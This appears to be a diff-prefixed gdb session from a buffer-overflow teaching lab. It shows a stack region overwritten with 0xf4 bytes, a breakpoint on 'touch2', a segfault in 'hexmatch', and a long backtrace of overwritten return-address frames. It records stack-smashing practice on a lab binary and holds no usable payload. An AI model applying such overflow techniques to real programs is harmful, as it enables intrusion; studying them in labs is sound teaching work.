+0x5561a0c8:	0x09	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0d0:	0xe3	0x1e	0x40	0x00	0x00	0x00	0x00	0x00
+0x5561a0d8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0e0:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+0x5561a0e8:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+0x5561a0f0:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+0x5561a0f8:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+0x5561a100:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+(gdb) break touch2
+Breakpoint 2 at 0x40188a: file visible.c, line 40.
+(gdb) continue
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000000000040195d in hexmatch (val=<optimized out>, sval=<optimized out>) at visible.c:68
+68	visible.c: No such file or directory.
+(gdb) bt
+#0  0x000000000040195d in hexmatch (val=<optimized out>, sval=<optimized out>) at visible.c:68
+#1  0xf4f4f4f4f4f4f4f4 in ?? ()
+#2  0xf4f4f4f4f4f4f4f4 in ?? ()
+#3  0xf4f4f4f4f4f4f4f4 in ?? ()
+#4  0xf4f4f4f4f4f4f4f4 in ?? ()
+#5  0xf4f4f4f4f4f4f4f4 in ?? ()
+#6  0xf4f4f4f4f4f4f4f4 in ?? ()
+#7  0xf4f4f4f4f4f4f4f4 in ?? ()
+#8  0xf4f4f4f4f4f4f4f4 in ?? ()
+#9  0xf4f4f4f4f4f4f4f4 in ?? ()
+#10 0xf4f4f4f4f4f4f4f4 in ?? ()
+#11 0xf4f4f4f4f4f4f4f4 in ?? ()
+#12 0xf4f4f4f4f4f4f4f4 in ?? ()
+#13 0xf4f4f4f4f4f4f4f4 in ?? ()
+#14 0xf4f4f4f4f4f4f4f4 in ?? ()
+#15 0xf4f4f4f4f4f4f4f4 in ?? ()
+#16 0xf4f4f4f4f4f4f4f4 in ?? ()
+#17 0xf4f4f4f4f4f4f4f4 in ?? ()
+#18 0xf4f4f4f4f4f4f4f4 in ?? ()
+#19 0xf4f4f4f4f4f4f4f4 in ?? ()
+#20 0xf4f4f4f4f4f4f4f4 in ?? ()
+#21 0xf4f4f4f4f4f4f4f4 in ?? ()
+#22 0xf4f4f4f4f4f4f4f4 in ?? ()
+#23 0xf4f4f4f4f4f4f4f4 in ?? ()
+#24 0xf4f4f4f4f4f4f4f4 in ?? ()
+#25 0xf4f4f4f4f4f4f4f4 in ?? ()
+#26 0xf4f4f4f4f4f4f4f4 in ?? ()
+#27 0xf4f4f4f4f4f4f4f4 in ?? ()
+#28 0xf4f4f4f4f4f4f4f4 in ?? ()
+#29 0xf4f4f4f4f4f4f4f4 in ?? ()
+#30 0xf4f4f4f4f4f4f4f4 in ?? ()
+#31 0xf4f4f4f4f4f4f4f4 in ?? ()
+#32 0xf4f4f4f4f4f4f4f4 in ?? ()
+#33 0xf4f4f4f4f4f4f4f4 in ?? ()
+#34 0xf4f4f4f4f4f4f4f4 in ?? ()
+#35 0xf4f4f4f4f4f4f4f4 in ?? ()
+#36 0xf4f4f4f4f4f4f4f4 in ?? ()
+#37 0xf4f4f4f4f4f4f4f4 in ?? ()
+#38 0xf4f4f4f4f4f4f4f4 in ?? ()
+#39 0xf4f4f4f4f4f4f4f4 in ?? ()
+#40 0xf4f4f4f4f4f4f4f4 in ?? ()
+#41 0xf4f4f4f4f4f4f4f4 in ?? ()
+#42 0xf4f4f4f4f4f4f4f4 in ?? ()
+#43 0xf4f4f4f4f4f4f4f4 in ?? ()
+#44 0xf4f4f4f4f4f4f4f4 in ?? ()
+#45 0xf4f4f4f4f4f4f4f4 in ?? ()
+#46 0xf4f4f4f4f4f4f4f4 in ?? ()
+#47 0xf4f4f4f4f4f4f4f4 in ?? ()
+#48 0xf4f4f4f4f4f4f4f4 in ?? ()
+#49 0xf4f4f4f4f4f4f4f4 in ?? ()
+#50 0xf4f4f4f4f4f4f4f4 in ?? ()
+---Type <return> to continue, or q <return> to quit---
+#51 0xf4f4f4f4f4f4f4f4 in ?? ()
+#52 0xf4f4f4f4f4f4f4f4 in ?? ()
+#53 0xf4f4f4f4f4f4f4f4 in ?? ()
+#54 0xf4f4f4f4f4f4f4f4 in ?? ()
+#55 0xf4f4f4f4f4f4f4f4 in ?? ()
+#56 0xf4f4f4f4f4f4f4f4 in ?? ()
+#57 0xf4f4f4f4f4f4f4f4 in ?? ()
+#58 0xf4f4f4f4f4f4f4f4 in ?? ()
+#59 0xf4f4f4f4f4f4f4f4 in ?? ()
+#60 0xf4f4f4f4f4f4f4f4 in ?? ()
+#61 0xf4f4f4f4f4f4f4f4 in ?? ()
+#62 0xf4f4f4f4f4f4f4f4 in ?? ()
+#63 0xf4f4f4f4f4f4f4f4 in ?? ()
+#64 0xf4f4f4f4f4f4f4f4 in ?? ()
+#65 0xf4f4f4f4f4f4f4f4 in ?? ()
+#66 0xf4f4f4f4f4f4f4f4 in ?? ()
+#67 0xf4f4f4f4f4f4f4f4 in ?? ()
+#68 0xf4f4f4f4f4f4f4f4 in ?? ()
+#69 0xf4f4f4f4f4f4f4f4 in ?? ()
+#70 0xf4f4f4f4f4f4f4f4 in ?? ()
+#71 0xf4f4f4f4f4f4f4f4 in ?? ()
+#72 0xf4f4f4f4f4f4f4f4 in ?? ()
+#73 0xf4f4f4f4f4f4f4f4 in ?? ()
+#74 0xf4f4f4f4f4f4f4f4 in ?? ()
+#75 0xf4f4f4f4f4f4f4f4 in ?? ()
+#76 0xf4f4f4f4f4f4f4f4 in ?? ()
+#77 0xf4f4f4f4f4f4f4f4 in ?? ()
+#78 0xf4f4f4f4f4f4f4f4 in ?? ()
+#79 0xf4f4f4f4f4f4f4f4 in ?? ()
+#80 0xf4f4f4f4f4f4f4f4 in ?? ()
+#81 0xf4f4f4f4f4f4f4f4 in ?? ()
+#82 0xf4f4f4f4f4f4f4f4 in ?? ()
+#83 0xf4f4f4f4f4f4f4f4 in ?? ()
+#84 0xf4f4f4f4f4f4f4f4 in ?? ()
+#85 0xf4f4f4f4f4f4f4f4 in ?? ()
+#86 0xf4f4f4f4f4f4f4f4 in ?? ()
+#87 0xf4f4f4f4f4f4f4f4 in ?? ()
+#88 0xf4f4f4f4f4f4f4f4 in ?? ()
+#89 0xf4f4f4f4f4f4f4f4 in ?? ()
+#90 0xf4f4f4f4f4f4f4f4 in ?? ()
+#91 0xf4f4f4f4f4f4f4f4 in ?? ()
+#92 0xf4f4f4f4f4f4f4f4 in ?? ()
+#93 0xf4f4f4f4f4f4f4f4 in ?? ()
+#94 0xf4f4f4f4f4f4f4f4 in ?? ()
+#95 0xf4f4f4f4f4f4f4f4 in ?? ()
+#96 0xf4f4f4f4f4f4f4f4 in ?? ()
+#97 0xf4f4f4f4f4f4f4f4 in ?? ()
+#98 0xf4f4f4f4f4f4f4f4 in ?? ()
+#99 0xf4f4f4f4f4f4f4f4 in ?? ()
+#100 0xf4f4f4f4f4f4f4f4 in ?? ()
+#101 0xf4f4f4f4f4f4f4f4 in ?? ()
+---Type <return> to continue, or q <return> to quit---
+#102 0xf4f4f4f4f4f4f4f4 in ?? ()
+#103 0xf4f4f4f4f4f4f4f4 in ?? ()
+#104 0xf4f4f4f4f4f4f4f4 in ?? ()
+#105 0xf4f4f4f4f4f4f4f4 in ?? ()
+#106 0xf4f4f4f4f4f4f4f4 in ?? ()
+#107 0xf4f4f4f4f4f4f4f4 in ?? ()
+#108 0xf4f4f4f4f4f4f4f4 in ?? ()
+#109 0xf4f4f4f4f4f4f4f4 in ?? ()
+#110 0xf4f4f4f4f4f4f4f4 in ?? ()
+#111 0xf4f4f4f4f4f4f4f4 in ?? ()
+#112 0xf4f4f4f4f4f4f4f4 in ?? ()
+#113 0xf4f4f4f4f4f4f4f4 in ?? ()
+#114 0xf4f4f4f4f4f4f4f4 in ?? ()
+#115 0xf4f4f4f4f4f4f4f4 in ?? ()
+#116 0xf4f4f4f4f4f4f4f4 in ?? ()
+#117 0xf4f4f4f4f4f4f4f4 in ?? ()
+#118 0xf4f4f4f4f4f4f4f4 in ?? ()
+#119 0xf4f4f4f4f4f4f4f4 in ?? ()
+#120 0xf4f4f4f4f4f4f4f4 in ?? ()
+#121 0xf4f4f4f4f4f4f4f4 in ?? ()
+#122 0xf4f4f4f4f4f4f4f4 in ?? ()
+#123 0xf4f4f4f4f4f4f4f4 in ?? ()
+#124 0xf4f4f4f4f4f4f4f4 in ?? ()
+#125 0xf4f4f4f4f4f4f4f4 in ?? ()
+#126 0xf4f4f4f4f4f4f4f4 in ?? ()
+#127 0xf4f4f4f4f4f4f4f4 in ?? ()
+#128 0xf4f4f4f4f4f4f4f4 in ?? ()
+#129 0xf4f4f4f4f4f4f4f4 in ?? ()
+#130 0xf4f4f4f4f4f4f4f4 in ?? ()
+#131 0xf4f4f4f4f4f4f4f4 in ?? ()
+#132 0xf4f4f4f4f4f4f4f4 in ?? ()
+#133 0xf4f4f4f4f4f4f4f4 in ?? ()
+#134 0xf4f4f4f4f4f4f4f4 in ?? ()
+#135 0xf4f4f4f4f4f4f4f4 in ?? ()
+#136 0xf4f4f4f4f4f4f4f4 in ?? ()
+#137 0xf4f4f4f4f4f4f4f4 in ?? ()
+#138 0xf4f4f4f4f4f4f4f4 in ?? ()
+#139 0xf4f4f4f4f4f4f4f4 in ?? ()
+#140 0xf4f4f4f4f4f4f4f4 in ?? ()
+#141 0xf4f4f4f4f4f4f4f4 in ?? ()
+#142 0xf4f4f4f4f4f4f4f4 in ?? ()
+#143 0xf4f4f4f4f4f4f4f4 in ?? ()
+#144 0xf4f4f4f4f4f4f4f4 in ?? ()
+#145 0xf4f4f4f4f4f4f4f4 in ?? ()
+#146 0xf4f4f4f4f4f4f4f4 in ?? ()
+#147 0xf4f4f4f4f4f4f4f4 in ?? ()
+#148 0xf4f4f4f4f4f4f4f4 in ?? ()
+#149 0xf4f4f4f4f4f4f4f4 in ?? ()
+#150 0xf4f4f4f4f4f4f4f4 in ?? ()
+#151 0xf4f4f4f4f4f4f4f4 in ?? ()
+#152 0xf4f4f4f4f4f4f4f4 in ?? ()
+---Type <return> to continue, or q <return> to quit---
+#153 0xf4f4f4f4f4f4f4f4 in ?? ()
+#154 0xf4f4f4f4f4f4f4f4 in ?? ()
+#155 0xf4f4f4f4f4f4f4f4 in ?? ()
+#156 0xf4f4f4f4f4f4f4f4 in ?? ()
+#157 0xf4f4f4f4f4f4f4f4 in ?? ()
+#158 0xf4f4f4f4f4f4f4f4 in ?? ()
+#159 0xf4f4f4f4f4f4f4f4 in ?? ()
+#160 0xf4f4f4f4f4f4f4f4 in ?? ()
+#161 0xf4f4f4f4f4f4f4f4 in ?? ()
+#162 0xf4f4f4f4f4f4f4f4 in ?? ()
+#163 0xf4f4f4f4f4f4f4f4 in ?? ()
+#164 0xf4f4f4f4f4f4f4f4 in ?? ()
+#165 0xf4f4f4f4f4f4f4f4 in ?? ()
+#166 0xf4f4f4f4f4f4f4f4 in ?? ()
+#167 0xf4f4f4f4f4f4f4f4 in ?? ()
+#168 0xf4f4f4f4f4f4f4f4 in ?? ()
+#169 0xf4f4f4f4f4f4f4f4 in ?? ()
+#170 0xf4f4f4f4f4f4f4f4 in ?? ()
+#171 0xf4f4f4f4f4f4f4f4 in ?? ()
+#172 0xf4f4f4f4f4f4f4f4 in ?? ()
+#173 0xf4f4f4f4f4f4f4f4 in ?? ()
+#174 0xf4f4f4f4f4f4f4f4 in ?? ()
+#175 0xf4f4f4f4f4f4f4f4 in ?? ()
+#176 0xf4f4f4f4f4f4f4f4 in ?? ()
+#177 0xf4f4f4f4f4f4f4f4 in ?? ()
+#178 0xf4f4f4f4f4f4f4f4 in ?? ()
+#179 0xf4f4f4f4f4f4f4f4 in ?? ()
+#180 0xf4f4f4f4f4f4f4f4 in ?? ()
+#181 0xf4f4f4f4f4f4f4f4 in ?? ()
+#182 0xf4f4f4f4f4f4f4f4 in ?? ()
+#183 0xf4f4f4f4f4f4f4f4 in ?? ()
+#184 0xf4f4f4f4f4f4f4f4 in ?? ()
+#185 0xf4f4f4f4f4f4f4f4 in ?? ()
+#186 0xf4f4f4f4f4f4f4f4 in ?? ()
+#187 0xf4f4f4f4f4f4f4f4 in ?? ()
+#188 0xf4f4f4f4f4f4f4f4 in ?? ()
+#189 0xf4f4f4f4f4f4f4f4 in ?? ()
+#190 0xf4f4f4f4f4f4f4f4 in ?? ()
+#191 0xf4f4f4f4f4f4f4f4 in ?? ()
+#192 0xf4f4f4f4f4f4f4f4 in ?? ()
+#193 0xf4f4f4f4f4f4f4f4 in ?? ()
+#194 0xf4f4f4f4f4f4f4f4 in ?? ()
+#195 0xf4f4f4f4f4f4f4f4 in ?? ()
+#196 0xf4f4f4f4f4f4f4f4 in ?? ()
+#197 0xf4f4f4f4f4f4f4f4 in ?? ()
+#198 0xf4f4f4f4f4f4f4f4 in ?? ()
+#199 0xf4f4f4f4f4f4f4f4 in ?? ()
+#200 0xf4f4f4f4f4f4f4f4 in ?? ()
+#201 0xf4f4f4f4f4f4f4f4 in ?? ()
+#202 0xf4f4f4f4f4f4f4f4 in ?? ()
+#203 0xf4f4f4f4f4f4f4f4 in ?? ()
+---Type <return> to continue, or q <return> to quit---
+#204 0xf4f4f4f4f4f4f4f4 in ?? ()
+#205 0xf4f4f4f4f4f4f4f4 in ?? ()
+#206 0xf4f4f4f4f4f4f4f4 in ?? ()
+#207 0xf4f4f4f4f4f4f4f4 in ?? ()
+#208 0xf4f4f4f4f4f4f4f4 in ?? ()
+#209 0xf4f4f4f4f4f4f4f4 in ?? ()
+#210 0xf4f4f4f4f4f4f4f4 in ?? ()
+#211 0xf4f4f4f4f4f4f4f4 in ?? ()
+#212 0xf4f4f4f4f4f4f4f4 in ?? ()
+#213 0xf4f4f4f4f4f4f4f4 in ?? ()
+#214 0xf4f4f4f4f4f4f4f4 in ?? ()
+#215 0xf4f4f4f4f4f4f4f4 in ?? ()
+#216 0xf4f4f4f4f4f4f4f4 in ?? ()
+#217 0xf4f4f4f4f4f4f4f4 in ?? ()
+#218 0xf4f4f4f4f4f4f4f4 in ?? ()
+#219 0xf4f4f4f4f4f4f4f4 in ?? ()
+#220 0xf4f4f4f4f4f4f4f4 in ?? ()
+#221 0xf4f4f4f4f4f4f4f4 in ?? ()
+#222 0xf4f4f4f4f4f4f4f4 in ?? ()
+#223 0xf4f4f4f4f4f4f4f4 in ?? ()
+#224 0xf4f4f4f4f4f4f4f4 in ?? ()
+#225 0xf4f4f4f4f4f4f4f4 in ?? ()
+#226 0xf4f4f4f4f4f4f4f4 in ?? ()
+#227 0xf4f4f4f4f4f4f4f4 in ?? ()
+#228 0xf4f4f4f4f4f4f4f4 in ?? ()
+#229 0xf4f4f4f4f4f4f4f4 in ?? ()
+#230 0xf4f4f4f4f4f4f4f4 in ?? ()
+#231 0xf4f4f4f4f4f4f4f4 in ?? ()
+#232 0xf4f4f4f4f4f4f4f4 in ?? ()
+#233 0xf4f4f4f4f4f4f4f4 in ?? ()
+#234 0xf4f4f4f4f4f4f4f4 in ?? ()
+#235 0xf4f4f4f4f4f4f4f4 in ?? ()
+#236 0xf4f4f4f4f4f4f4f4 in ?? ()
+#237 0xf4f4f4f4f4f4f4f4 in ?? ()
+#238 0xf4f4f4f4f4f4f4f4 in ?? ()
+#239 0xf4f4f4f4f4f4f4f4 in ?? ()
+#240 0xf4f4f4f4f4f4f4f4 in ?? ()
+#241 0xf4f4f4f4f4f4f4f4 in ?? ()
+#242 0xf4f4f4f4f4f4f4f4 in ?? ()
+#243 0xf4f4f4f4f4f4f4f4 in ?? ()
+#244 0xf4f4f4f4f4f4f4f4 in ?? ()
+#245 0xf4f4f4f4f4f4f4f4 in ?? ()
+#246 0xf4f4f4f4f4f4f4f4 in ?? ()
+#247 0xf4f4f4f4f4f4f4f4 in ?? ()
+#248 0xf4f4f4f4f4f4f4f4 in ?? ()
+#249 0xf4f4f4f4f4f4f4f4 in ?? ()
+#250 0xf4f4f4f4f4f4f4f4 in ?? ()
+#251 0xf4f4f4f4f4f4f4f4 in ?? ()
+#252 0xf4f4f4f4f4f4f4f4 in ?? ()
+#253 0xf4f4f4f4f4f4f4f4 in ?? ()
+#254 0xf4f4f4f4f4f4f4f4 in ?? ()
+---Type <return> to continue, or q <return> to quit---
+#255 0xf4f4f4f4f4f4f4f4 in ?? ()
+#256 0xf4f4f4f4f4f4f4f4 in ?? ()
+#257 0xf4f4f4f4f4f4f4f4 in ?? ()
+#258 0xf4f4f4f4f4f4f4f4 in ?? ()
+#259 0xf4f4f4f4f4f4f4f4 in ?? ()
+#260 0xf4f4f4f4f4f4f4f4 in ?? ()
+#261 0xf4f4f4f4f4f4f4f4 in ?? ()
+#262 0xf4f4f4f4f4f4f4f4 in ?? ()
+#263 0xf4f4f4f4f4f4f4f4 in ?? ()
+#264 0xf4f4f4f4f4f4f4f4 in ?? ()
+#265 0xf4f4f4f4f4f4f4f4 in ?? ()
+#266 0xf4f4f4f4f4f4f4f4 in ?? ()
+#267 0xf4f4f4f4f4f4f4f4 in ?? ()
+#268 0xf4f4f4f4f4f4f4f4 in ?? ()
+#269 0xf4f4f4f4f4f4f4f4 in ?? ()
+#270 0xf4f4f4f4f4f4f4f4 in ?? ()
+#271 0xf4f4f4f4f4f4f4f4 in ?? ()
+#272 0xf4f4f4f4f4f4f4f4 in ?? ()
+#273 0xf4f4f4f4f4f4f4f4 in ?? ()
+#274 0xf4f4f4f4f4f4f4f4 in ?? ()
+#275 0xf4f4f4f4f4f4f4f4 in ?? ()
+#276 0xf4f4f4f4f4f4f4f4 in ?? ()
+#277 0xf4f4f4f4f4f4f4f4 in ?? ()
+#278 0xf4f4f4f4f4f4f4f4 in ?? ()
+#279 0xf4f4f4f4f4f4f4f4 in ?? ()
+#280 0xf4f4f4f4f4f4f4f4 in ?? ()
+#281 0xf4f4f4f4f4f4f4f4 in ?? ()
+#282 0xf4f4f4f4f4f4f4f4 in ?? ()
+#283 0xf4f4f4f4f4f4f4f4 in ?? ()
+#284 0xf4f4f4f4f4f4f4f4 in ?? ()
+#285 0xf4f4f4f4f4f4f4f4 in ?? ()
+#286 0xf4f4f4f4f4f4f4f4 in ?? ()
+#287 0xf4f4f4f4f4f4f4f4 in ?? ()
+#288 0xf4f4f4f4f4f4f4f4 in ?? ()
+#289 0xf4f4f4f4f4f4f4f4 in ?? ()
+#290 0xf4f4f4f4f4f4f4f4 in ?? ()
+#291 0xf4f4f4f4f4f4f4f4 in ?? ()
+#292 0xf4f4f4f4f4f4f4f4 in ?? ()
+#293 0xf4f4f4f4f4f4f4f4 in ?? ()
+#294 0xf4f4f4f4f4f4f4f4 in ?? ()
+#295 0xf4f4f4f4f4f4f4f4 in ?? ()
+#296 0xf4f4f4f4f4f4f4f4 in ?? ()
+#297 0xf4f4f4f4f4f4f4f4 in ?? ()
+#298 0xf4f4f4f4f4f4f4f4 in ?? ()
+#299 0xf4f4f4f4f4f4f4f4 in ?? ()
+#300 0xf4f4f4f4f4f4f4f4 in ?? ()
+#301 0xf4f4f4f4f4f4f4f4 in ?? ()
+#302 0xf4f4f4f4f4f4f4f4 in ?? ()
+#303 0xf4f4f4f4f4f4f4f4 in ?? ()
+#304 0xf4f4f4f4f4f4f4f4 in ?? ()
+#305 0xf4f4f4f4f4f4f4f4 in ?? ()
+---Type <return> to continue, or q <return> to quit---
+#306 0xf4f4f4f4f4f4f4f4 in ?? ()
+#307 0xf4f4f4f4f4f4f4f4 in ?? ()
+#308 0xf4f4f4f4f4f4f4f4 in ?? ()
+#309 0xf4f4f4f4f4f4f4f4 in ?? ()
+#310 0xf4f4f4f4f4f4f4f4 in ?? ()
+#311 0xf4f4f4f4f4f4f4f4 in ?? ()
+#312 0xf4f4f4f4f4f4f4f4 in ?? ()
+#313 0xf4f4f4f4f4f4f4f4 in ?? ()
+#314 0xf4f4f4f4f4f4f4f4 in ?? ()
+#315 0xf4f4f4f4f4f4f4f4 in ?? ()
+#316 0xf4f4f4f4f4f4f4f4 in ?? ()
+#317 0xf4f4f4f4f4f4f4f4 in ?? ()
+#318 0xf4f4f4f4f4f4f4f4 in ?? ()
+#319 0xf4f4f4f4f4f4f4f4 in ?? ()
+#320 0xf4f4f4f4f4f4f4f4 in ?? ()
+#321 0xf4f4f4f4f4f4f4f4 in ?? ()
+#322 0xf4f4f4f4f4f4f4f4 in ?? ()
+#323 0xf4f4f4f4f4f4f4f4 in ?? ()
+#324 0xf4f4f4f4f4f4f4f4 in ?? ()
+#325 0xf4f4f4f4f4f4f4f4 in ?? ()
+#326 0xf4f4f4f4f4f4f4f4 in ?? ()
+#327 0xf4f4f4f4f4f4f4f4 in ?? ()
+#328 0xf4f4f4f4f4f4f4f4 in ?? ()
+#329 0xf4f4f4f4f4f4f4f4 in ?? ()
+#330 0xf4f4f4f4f4f4f4f4 in ?? ()
+#331 0xf4f4f4f4f4f4f4f4 in ?? ()
+#332 0xf4f4f4f4f4f4f4f4 in ?? ()
+#333 0xf4f4f4f4f4f4f4f4 in ?? ()
+#334 0xf4f4f4f4f4f4f4f4 in ?? ()
+#335 0xf4f4f4f4f4f4f4f4 in ?? ()
+#336 0xf4f4f4f4f4f4f4f4 in ?? ()
+#337 0xf4f4f4f4f4f4f4f4 in ?? ()
+#338 0xf4f4f4f4f4f4f4f4 in ?? ()
+#339 0xf4f4f4f4f4f4f4f4 in ?? ()
+#340 0xf4f4f4f4f4f4f4f4 in ?? ()
+#341 0xf4f4f4f4f4f4f4f4 in ?? ()
+#342 0xf4f4f4f4f4f4f4f4 in ?? ()
+#343 0xf4f4f4f4f4f4f4f4 in ?? ()
+#344 0xf4f4f4f4f4f4f4f4 in ?? ()
+#345 0xf4f4f4f4f4f4f4f4 in ?? ()
+#346 0xf4f4f4f4f4f4f4f4 in ?? ()
+#347 0xf4f4f4f4f4f4f4f4 in ?? ()
+#348 0xf4f4f4f4f4f4f4f4 in ?? ()
+#349 0xf4f4f4f4f4f4f4f4 in ?? ()
+#350 0xf4f4f4f4f4f4f4f4 in ?? ()
+#351 0xf4f4f4f4f4f4f4f4 in ?? ()
+#352 0xf4f4f4f4f4f4f4f4 in ?? ()
+#353 0xf4f4f4f4f4f4f4f4 in ?? ()
+#354 0xf4f4f4f4f4f4f4f4 in ?? ()
+#355 0xf4f4f4f4f4f4f4f4 in ?? ()
+#356 0xf4f4f4f4f4f4f4f4 in ?? ()
+---Type <return> to continue, or q <return> to quit---
+#357 0xf4f4f4f4f4f4f4f4 in ?? ()
+#358 0xf4f4f4f4f4f4f4f4 in ?? ()
+#359 0xf4f4f4f4f4f4f4f4 in ?? ()
+#360 0xf4f4f4f4f4f4f4f4 in ?? ()
+#361 0xf4f4f4f4f4f4f4f4 in ?? ()
+#362 0xf4f4f4f4f4f4f4f4 in ?? ()
+#363 0xf4f4f4f4f4f4f4f4 in ?? ()
+#364 0xf4f4f4f4f4f4f4f4 in ?? ()
+#365 0xf4f4f4f4f4f4f4f4 in ?? ()
+#366 0xf4f4f4f4f4f4f4f4 in ?? ()
+#367 0xf4f4f4f4f4f4f4f4 in ?? ()
+#368 0xf4f4f4f4f4f4f4f4 in ?? ()
+#369 0xf4f4f4f4f4f4f4f4 in ?? ()
+#370 0xf4f4f4f4f4f4f4f4 in ?? ()
+#371 0xf4f4f4f4f4f4f4f4 in ?? ()
+#372 0xf4f4f4f4f4f4f4f4 in ?? ()
+#373 0xf4f4f4f4f4f4f4f4 in ?? ()
+#374 0xf4f4f4f4f4f4f4f4 in ?? ()
+#375 0xf4f4f4f4f4f4f4f4 in ?? ()
+#376 0xf4f4f4f4f4f4f4f4 in ?? ()
+#377 0xf4f4f4f4f4f4f4f4 in ?? ()
+#378 0xf4f4f4f4f4f4f4f4 in ?? ()
+#379 0xf4f4f4f4f4f4f4f4 in ?? ()
+#380 0xf4f4f4f4f4f4f4f4 in ?? ()
+#381 0xf4f4f4f4f4f4f4f4 in ?? ()
+#382 0xf4f4f4f4f4f4f4f4 in ?? ()
+#383 0xf4f4f4f4f4f4f4f4 in ?? ()
+#384 0xf4f4f4f4f4f4f4f4 in ?? ()
+#385 0xf4f4f4f4f4f4f4f4 in ?? ()
+#386 0xf4f4f4f4f4f4f4f4 in ?? ()
+#387 0xf4f4f4f4f4f4f4f4 in ?? ()
+#388 0xf4f4f4f4f4f4f4f4 in ?? ()
+#389 0xf4f4f4f4f4f4f4f4 in ?? ()
+#390 0xf4f4f4f4f4f4f4f4 in ?? ()
+#391 0xf4f4f4f4f4f4f4f4 in ?? ()
+#392 0xf4f4f4f4f4f4f4f4 in ?? ()
+#393 0xf4f4f4f4f4f4f4f4 in ?? ()
+#394 0xf4f4f4f4f4f4f4f4 in ?? ()
+#395 0xf4f4f4f4f4f4f4f4 in ?? ()
+#396 0xf4f4f4f4f4f4f4f4 in ?? ()
+#397 0xf4f4f4f4f4f4f4f4 in ?? ()
+#398 0xf4f4f4f4f4f4f4f4 in ?? ()
+#399 0xf4f4f4f4f4f4f4f4 in ?? ()
+#400 0xf4f4f4f4f4f4f4f4 in ?? ()
+#401 0xf4f4f4f4f4f4f4f4 in ?? ()
+#402 0xf4f4f4f4f4f4f4f4 in ?? ()
+#403 0xf4f4f4f4f4f4f4f4 in ?? ()
+#404 0xf4f4f4f4f4f4f4f4 in ?? ()
+#405 0xf4f4f4f4f4f4f4f4 in ?? ()
+#406 0xf4f4f4f4f4f4f4f4 in ?? ()
+#407 0xf4f4f4f4f4f4f4f4 in ?? ()
+---Type <return> to continue, or q <return> to quit---
+#408 0xf4f4f4f4f4f4f4f4 in ?? ()
+#409 0xf4f4f4f4f4f4f4f4 in ?? ()
+#410 0xf4f4f4f4f4f4f4f4 in ?? ()
+#411 0xf4f4f4f4f4f4f4f4 in ?? ()
+#412 0xf4f4f4f4f4f4f4f4 in ?? ()
+#413 0xf4f4f4f4f4f4f4f4 in ?? ()
+#414 0xf4f4f4f4f4f4f4f4 in ?? ()
+#415 0xf4f4f4f4f4f4f4f4 in ?? ()
+#416 0xf4f4f4f4f4f4f4f4 in ?? ()
+#417 0xf4f4f4f4f4f4f4f4 in ?? ()
+#418 0xf4f4f4f4f4f4f4f4 in ?? ()
+#419 0xf4f4f4f4f4f4f4f4 in ?? ()
+#420 0xf4f4f4f4f4f4f4f4 in ?? ()
+#421 0xf4f4f4f4f4f4f4f4 in ?? ()
+#422 0xf4f4f4f4f4f4f4f4 in ?? ()
+#423 0xf4f4f4f4f4f4f4f4 in ?? ()
+#424 0xf4f4f4f4f4f4f4f4 in ?? ()
+#425 0xf4f4f4f4f4f4f4f4 in ?? ()
+#426 0xf4f4f4f4f4f4f4f4 in ?? ()
+#427 0xf4f4f4f4f4f4f4f4 in ?? ()
+#428 0xf4f4f4f4f4f4f4f4 in ?? ()
+#429 0xf4f4f4f4f4f4f4f4 in ?? ()
+#430 0xf4f4f4f4f4f4f4f4 in ?? ()
+#431 0xf4f4f4f4f4f4f4f4 in ?? ()
+#432 0xf4f4f4f4f4f4f4f4 in ?? ()
+#433 0xf4f4f4f4f4f4f4f4 in ?? ()
+#434 0xf4f4f4f4f4f4f4f4 in ?? ()
+#435 0xf4f4f4f4f4f4f4f4 in ?? ()
+#436 0xf4f4f4f4f4f4f4f4 in ?? ()
+#437 0xf4f4f4f4f4f4f4f4 in ?? ()
+#438 0xf4f4f4f4f4f4f4f4 in ?? ()
+#439 0xf4f4f4f4f4f4f4f4 in ?? ()
+#440 0xf4f4f4f4f4f4f4f4 in ?? ()
+#441 0xf4f4f4f4f4f4f4f4 in ?? ()
+#442 0xf4f4f4f4f4f4f4f4 in ?? ()
+#443 0xf4f4f4f4f4f4f4f4 in ?? ()
+#444 0xf4f4f4f4f4f4f4f4 in ?? ()
+#445 0xf4f4f4f4f4f4f4f4 in ?? ()
+#446 0xf4f4f4f4f4f4f4f4 in ?? ()
+#447 0xf4f4f4f4f4f4f4f4 in ?? ()
+#448 0xf4f4f4f4f4f4f4f4 in ?? ()
+#449 0xf4f4f4f4f4f4f4f4 in ?? ()
+#450 0xf4f4f4f4f4f4f4f4 in ?? ()
+#451 0xf4f4f4f4f4f4f4f4 in ?? ()
+#452 0xf4f4f4f4f4f4f4f4 in ?? ()
+#453 0xf4f4f4f4f4f4f4f4 in ?? ()
+#454 0xf4f4f4f4f4f4f4f4 in ?? ()
+#455 0xf4f4f4f4f4f4f4f4 in ?? ()
+#456 0xf4f4f4f4f4f4f4f4 in ?? ()
+#457 0xf4f4f4f4f4f4f4f4 in ?? ()
+#458 0xf4f4f4f4f4f4f4f4 in ?? ()
+---Type <return> to continue, or q <return> to quit---
+#459 0xf4f4f4f4f4f4f4f4 in ?? ()
+#460 0xf4f4f4f4f4f4f4f4 in ?? ()
+#461 0xf4f4f4f4f4f4f4f4 in ?? ()
+#462 0xf4f4f4f4f4f4f4f4 in ?? ()
+#463 0xf4f4f4f4f4f4f4f4 in ?? ()
+#464 0xf4f4f4f4f4f4f4f4 in ?? ()
+#465 0xf4f4f4f4f4f4f4f4 in ?? ()
+#466 0xf4f4f4f4f4f4f4f4 in ?? ()
+#467 0xf4f4f4f4f4f4f4f4 in ?? ()
+#468 0xf4f4f4f4f4f4f4f4 in ?? ()
+#469 0xf4f4f4f4f4f4f4f4 in ?? ()
+#470 0xf4f4f4f4f4f4f4f4 in ?? ()
+#471 0xf4f4f4f4f4f4f4f4 in ?? ()
+#472 0xf4f4f4f4f4f4f4f4 in ?? ()
+#473 0xf4f4f4f4f4f4f4f4 in ?? ()
+#474 0xf4f4f4f4f4f4f4f4 in ?? ()
